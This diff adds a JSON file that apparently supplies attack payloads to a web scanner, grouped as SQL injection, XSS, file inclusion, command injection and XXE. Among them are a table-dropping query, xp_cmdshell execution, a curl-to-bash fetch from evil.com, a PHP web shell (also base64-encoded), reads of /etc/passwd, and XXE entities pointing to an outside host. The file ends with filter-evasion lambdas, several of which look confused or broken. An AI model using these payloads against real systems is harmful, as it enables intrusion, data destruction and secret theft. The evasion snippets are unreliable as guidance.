@@ -1,0 +1,59 @@
+{
+    "SQLI": {
+      "BASIC": ["' OR '1'='1", "'; DROP TABLE users;--", "\" OR \"1\"=\"1\""],
+      "ADVANCED": ["' UNION SELECT 1,2,3--", "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';--", "\" UNION SELECT NULL, @@version, NULL--"],
+      "BLIND": ["' AND (SELECT 1 FROM (SELECT count(*), CONCAT((SELECT (SELECT @@version) FROM information_schema.tables LIMIT 0,1), 0x3a, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)='1'"]
+    },
+    "XSS": {
+      "BASIC": ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert('XSS')>"],
+      "ADVANCED": ["<iframe src=javascript:alert('XSS')>", "<details open ontoggle=alert()>"],
+      "dom": ["<img src=x onerror=eval(location.hash.substring(1))>#alert(1)"]
+    },
+    "LFI": {
+      "BASIC": ["../../../../etc/passwd", "../../../../etc/hosts", "file:///etc/passwd"],
+      "ADVANCED": ["php://filter/convert.base64-encode/resource=/etc/passwd", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"],
+      "rce": ["../../../../../../../../../proc/self/environ"]
+    },
+    "RCE": {
+      "BASIC": ["$(whoami)", "; whoami", "| whoami"],
+      "ADVANCED": ["`whoami`", "$(curl http://evil.com/shell.sh | bash)", "; powershell.exe -c \"whoami\""],
+      "code_injection": ["<?php system($_GET['cmd']); ?>"]
+    },
+    "XXE": {
+      "BASIC": ["<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>", "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://evil.com/xxe.dtd\"> ]><foo>&xxe;</foo>"],
+      "ADVANCED": ["<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\"> %xxe; ]>"]
+    },
+    "BYPASSES": {
+      "SQLI": {
+        "URL_ENCODE": "lambda payload: urllib.parse.quote(payload)",
+        "CHAR_ENCODING": "lambda payload: ''.join(['%' + hex(ord(c))[2:].zfill(2) for c in payload])",
+        "DOUBLE_URL_ENCODE": "lambda payload: urllib.parse.quote(urllib.parse.quote(payload))",
+        "SPACE_TO_COMMENT": "lambda payload: payload.replace(' ', '/**/')",
+        "NO_SPACE": "lambda payload: payload.replace(' ', '')",
+        "RANDOM_CASE": "lambda payload: ''.join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])"
+      },
+      "XSS": {
+        "HTML_ENCODE": "lambda payload: payload.replace('<', '&lt;').replace('>', '&gt;')",
+        "BASE64_ENCODE": "lambda payload: base64.b64encode(payload.encode()).decode()",
+        "EVENT_HANDLERS": "lambda payload: payload.replace('alert', 'confirm')",
+        "HTML_ENTITIES": "lambda payload: ''.join(['&#x{:x};'.format(ord(c)) for c in payload])"
+      },
+      "LFI": {
+        "DOUBLE_ENCODE": "lambda payload: urllib.parse.quote(urllib.parse.quote(payload))",
+        "NULL_BYTE": "lambda payload: payload + '%00'",
+        "PATH_TRUNCATION": "lambda payload: payload + '/././././././././././././././'",
+        "WRAPPER_ENCODE": "lambda payload: 'php://filter/convert.base64-encode/resource=' + payload"
+      },
+      "RCE": {
+        "COMMAND_SUBSTITUTION": "lambda payload: payload.replace('whoami', '$(whoami)')",
+        "ESCAPING": "lambda payload: payload.replace(';', '\\;')",
+        "BACKTICKS": "lambda payload: payload.replace(';', '`') ",
+        "VARIABLE_INJECTION": "lambda payload: payload.replace('whoami','$USER')"
+      },
+      "XXE": {
+        "EXPECT_WRAPPER": "lambda payload: payload.replace('file://', 'expect://file://')",
+        "PHP_WRAPPER": "lambda payload: payload.replace('file://', 'php://filter/read=convert.base64-encode/resource=file://')",
+        "DATA_WRAPPER": "lambda payload: payload.replace('file://', 'data://text/plain;base64,' + base64.b64encode(open(payload[7:]).read().encode()).decode())"
+      }
+    }
+  }
